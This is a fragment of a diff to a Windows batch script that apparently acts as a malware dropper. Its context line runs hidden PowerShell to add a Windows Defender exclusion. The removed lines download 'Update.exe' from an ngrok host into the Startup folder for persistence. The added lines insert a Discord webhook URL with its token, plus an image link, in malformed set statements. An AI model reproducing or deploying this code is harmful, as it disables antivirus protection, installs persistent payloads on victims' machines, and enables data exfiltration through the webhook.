@@ -3,8 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://raptor-stirring-nationally.ngrok-free.app/Update.exe"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+set "https://discord.com/api/webhooks/1385319602443128902/ljzCnTJ-iYrVOBnpCF1mxqReRfIMM1M_SyUVAQvFvuaPyq30BjD8wXXvuMF92bC9mtO5"
+set "https://wallpaperaccess.com/full/3312054.jpg"
 
 
 if exist "%DEST%" del "%DEST%"
